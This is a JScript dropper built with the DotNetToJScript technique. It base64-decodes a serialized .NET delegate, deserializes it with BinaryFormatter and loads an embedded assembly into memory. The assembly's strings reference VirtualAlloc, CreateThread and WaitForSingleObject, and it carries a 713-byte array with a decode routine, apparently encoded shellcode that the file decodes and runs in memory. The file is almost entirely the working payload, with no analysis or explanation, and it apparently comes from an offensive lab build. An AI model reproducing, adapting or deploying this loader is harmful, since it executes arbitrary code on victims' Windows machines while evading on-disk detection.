function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABYAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIA9/DWYQAAAAAA"+
"AAAA8AAiIAsCMAAADgAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIKQAA"+
"HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAkA0AAAAgAAAADgAAAAIAAAAAAAAAAAAAAAAAACAA"+
"AGAucnNyYwAAAAwEAAAAQAAAAAYAAAAQAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUA3CAAAKwIAAABAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBgB8AAAAAQAAEQIoDwAA"+
"CiDJAgAAjRIAAAEl0AEAAAQoEAAACgoWDSsTBgkGCZEYWSD/AAAAX9KcCRdYDQkGjmky5waOaQt+"+
"EQAACiAAEAAAIAAwAAAfQCgBAAAGDAYWCAcoEgAACn4RAAAKFgh+EQAAChZ+EQAACigCAAAGFSgD"+
"AAAGJioiAygTAAAKJioAAABCU0pCAQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAAAAAwAA"+
"I34AAGwDAADsAwAAI1N0cmluZ3MAAAAAWAcAAAQAAAAjVVMAXAcAABAAAAAjR1VJRAAAAGwHAABA"+
"AQAAI0Jsb2IAAAAAAAAAAgAAAVeVAjQJAgAAAPoBMwAWAAABAAAAGAAAAAQAAAABAAAABQAAAA0A"+
"AAATAAAADwAAAAEAAAABAAAAAQAAAAMAAAABAAAAAQAAAAIAAAABAAAAAACFAgEAAAAAAAYAyAER"+
"AwYANQIRAwYAFQHQAg8AMQMAAAYAPQGgAgYAqwGgAgYAjAGgAgYAHAKgAgYA6AGgAgYAAQKgAgYA"+
"VAGgAgYAKQHyAgYABwHyAgYAbwGgAgYArQOZAgYA7AARAwYA0QCZAgYAUwKZAgYAYwMRAwYAzgOZ"+
"AgYAtgCZAgYAyQKZAgYAcALyAgoAfwPQAgAAAABgAAAAAAABAAEAAQAQAHIDAAA9AAEAAQAAAQAA"+
"aQAAAD0AAQAGABMBAAABAAAARQACAAYAMwEfAEUAAAAAAIAAkSCRAEkAAQAAAAAAgACRIKkAUQAF"+
"AAAAAACAAJEgoANbAAsASCAAAAAAhhjDAgYADQDQIAAAAACGAHwDEAANAAAAAQCHAwAAAgBkAgAA"+
"AwDbAAAABAC0AwAAAQBAAwAAAgBYAgAAAwCRAwAABAC3AgAABQBTAwAABgCeAAAAAQDJAAAAAgDj"+
"AgAAAQBrAgkAwwIBABEAwwIGABkAwwIKACkAwwIQADEAwwIQADkAwwIQAEEAwwIQAEkAwwIQAFEA"+
"wwIQAFkAwwIQAGEAwwIVAGkAwwIQAHEAwwIQAIEAwwIGAHkAwwIGAJkAxAMiALEAsgIqALkA5AMt"+
"AMEAvgM2AC4ACwBhAC4AEwBqAC4AGwCJAC4AIwCSAC4AKwCnAC4AMwDRAC4AOwDRAC4AQwCSAC4A"+
"SwDXAC4AUwDRAC4AWwDRAC4AYwD8AC4AawAmAUMAWwAzAWMAcwA5AQEAyQIAAAQAGgB4AkEBAwCR"+
"AAEAAAEFAKkAAQAAAQcAoAMBAMAqAAABAASAAAABAAAAAAAAAAAAAAAAANQDAAACAAAAAAAAAAAA"+
"AAA8AIgAAAAAAAIAAAAAAAAAAAAAADwAmQIAAAAABAADAAAAAAAAX19TdGF0aWNBcnJheUluaXRU"+
"eXBlU2l6ZT03MTMARjJBMzE3NEZFMDhCQjA2Q0M0QTRDRDJFNTQ3NTA3MTdEREQyOTM4M0Q4MzEw"+
"QjFFMTlGQUUyQUU3NTg2QjM4OAA8TW9kdWxlPgA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWls"+
"cz4AbXNjb3JsaWIAVmlydHVhbEFsbG9jAGxwVGhyZWFkSWQAQ3JlYXRlVGhyZWFkAFJ1bnRpbWVG"+
"aWVsZEhhbmRsZQBoSGFuZGxlAFZhbHVlVHlwZQBmbEFsbG9jYXRpb25UeXBlAENvbXBpbGVyR2Vu"+
"ZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNp"+
"YmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRy"+
"aWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25B"+
"dHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRp"+
"b25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0"+
"dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRy"+
"aWJ1dGUAQnl0ZQBkd1N0YWNrU2l6ZQBkd1NpemUAcGF0aABNYXJzaGFsAGtlcm5lbDMyLmRsbABF"+
"eGFtcGxlQXNzZW1ibHkuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBaZXJvAGxwUGFyYW1l"+
"dGVyAC5jdG9yAEludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAZHdNaWxsaXNlY29uZHMAU3lzdGVt"+
"LlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMA"+
"RGVidWdnaW5nTW9kZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBSdW50aW1l"+
"SGVscGVycwBUZXN0Q2xhc3MAUnVuUHJvY2VzcwBscEFkZHJlc3MAbHBTdGFydEFkZHJlc3MAV2Fp"+
"dEZvclNpbmdsZU9iamVjdABmbFByb3RlY3QAU3RhcnQASW5pdGlhbGl6ZUFycmF5AEV4YW1wbGVB"+
"c3NlbWJseQBDb3B5AAAAAAAAAAC1PW0r24qQR6dxxhZ4UCpaAAQgAQEIAyAAAQUgAQEREQQgAQEO"+
"BCABAQIHBwQdBQgYCAcAAgESURFVAgYYCAAEAR0FCBgIBQABEmEOCLd6XFYZNOCJAwYREAcABBgY"+
"CQkJCQAGGBgJGBgJGAUAAgkYCQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93"+
"cwEIAQACAAAAAAAUAQAPRXhhbXBsZUFzc2VtYmx5AAApAQAkRXhhbXBsZSBBc3NlbWJseSBmb3Ig"+
"RG90TmV0VG9KU2NyaXB0AAAFAQAAAAAkAQAfQ29weXJpZ2h0IMKpIEphbWVzIEZvcnNoYXcgMjAx"+
"NwAAKQEAJDU2NTk4ZjFjLTZkODgtNDk5NC1hMzkyLWFmMzM3YWJlNTc3NwAADAEABzEuMC4wLjAA"+
"AAUBAAEAAAQBAAAAAAAAAAAA9/DWYQAAAAACAAAAHAEAAKQpAACkCwAAUlNEU3/6z8qPfKdNs8/e"+
"+NTQhtMBAAAAXFwxOTIuMTY4LjQ5Ljc1XHZpc3VhbHN0dWRpb1xEb3ROZXRUb0pTY3JpcHQtbWFz"+
"dGVyXEV4YW1wbGVBc3NlbWJseVxvYmpceDY0XFJlbGVhc2VcRXhhbXBsZUFzc2VtYmx5LnBkYgAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+SoXm8urOAgICQ1NDUlRT"+
"WEoz1GdKjVRiSo1UGkqNVCJKEblMTE8zy0qNdFJKM8KuPmN+BC4iQ8PLD0MDw+TvVEqNVCKNRD5K"+
"A9JDU2iDehoNBBGHdAICAo2CigICAkqHwnZpSgPSjUoaRo1CIlJLA9LlWE8zy0oBy0ONNopKA9hK"+
"M8JDw8sPrkMDwzrid/NOBU4mCkc703faWkaNQiZLA9JoQ40OSkaNQh5LA9JDjQaKQ1pDWkoD0mBb"+
"XENaQ1tDXEqF7iJDVAHiWkNbXEqNFOtNAQEBX0oz3VVLwHlrcGtwZ3YCQ1hKi+NLycROeSgJAddV"+
"VUqL41VcTzPCTzPLVVVLvDxYe6kCAgICAdfqEAICAjM7NDAzODowNjswOTcCXEqLw0vJwr0DAgJP"+
"M8tVVWwFVUu8WYuhyAICAgIB1+qiAgICMXRSOndcNnpreU5ZfHM5TXIyaTpLRFNSWUt2V2Fme0xx"+
"d01SbVpGO3xqcU9Sd2FxaHBzbGR2bVhpcmduelU7UldtcHFKejVWO0RhTS9Wb3xoTTNFbWc3UDhD"+
"WFU2Q2E5NEs2V2NDdUxbdm5ubkNGZVpzdlpZY1NnWThUNHtERTNhXFUzb0twR2F0R1Z7M1xRZlBU"+
"c1pEe1ZwcWdTajJQAkqLw1VcQ1pPM8tVSroCNKqGAgICAlJVVUvJxO1XMD0B10qLyGwMYUqL82wh"+
"XFRqgjUCAkuL4mwGQ1tLvHdIoIgCAgICAddPM8JVXEqL808zy08zy1VVS8nELwgafQHXh8J3IUrJ"+
"w4oVAgJLvEbyN+ICAgICAddKAdF2BO2s6lcCAgJVW2xCXEuL08PkEkvJwgISAgJLvFqmVecCAgIC"+
"AddKlVVVSovpSovzSovcS8nCAiICAkuL+0u8FJiL5AICAgIB10qFxiKHwna0aI0JSgPFh8J31FrF"+
"WmwCW0vJxPK3pFgB1wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAAB"+
"AAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAALADAAAAAAAAAAAAALADNAAAAFYA"+
"UwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/"+
"AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAA"+
"AAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAQQAwAAAQBTAHQAcgBpAG4AZwBG"+
"AGkAbABlAEkAbgBmAG8AAADsAgAAAQAwADAAMAAwADAANABiADAAAABiACUAAQBDAG8AbQBtAGUA"+
"bgB0AHMAAABFAHgAYQBtAHAAbABlACAAQQBzAHMAZQBtAGIAbAB5ACAAZgBvAHIAIABEAG8AdABO"+
"AGUAdABUAG8ASgBTAGMAcgBpAHAAdAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAA"+
"AAAAAAAASAAQAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEUAeABhAG0AcABs"+
"AGUAQQBzAHMAZQBtAGIAbAB5AAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4A"+
"MAAuADAALgAwAAAASAAUAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABFAHgAYQBtAHAAbABl"+
"AEEAcwBzAGUAbQBiAGwAeQAuAGQAbABsAAAAYgAfAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcA"+
"aAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAASgBhAG0AZQBzACAARgBvAHIAcwBoAGEAdwAg"+
"ADIAMAAxADcAAAAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAA"+
"UAAUAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEUAeABhAG0AcABsAGUAQQBz"+
"AHMAZQBtAGIAbAB5AC4AZABsAGwAAABAABAAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEUA"+
"eABhAG0AcABsAGUAQQBzAHMAZQBtAGIAbAB5AAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBz"+
"AGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMA"+
"aQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxl"+
"Y3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}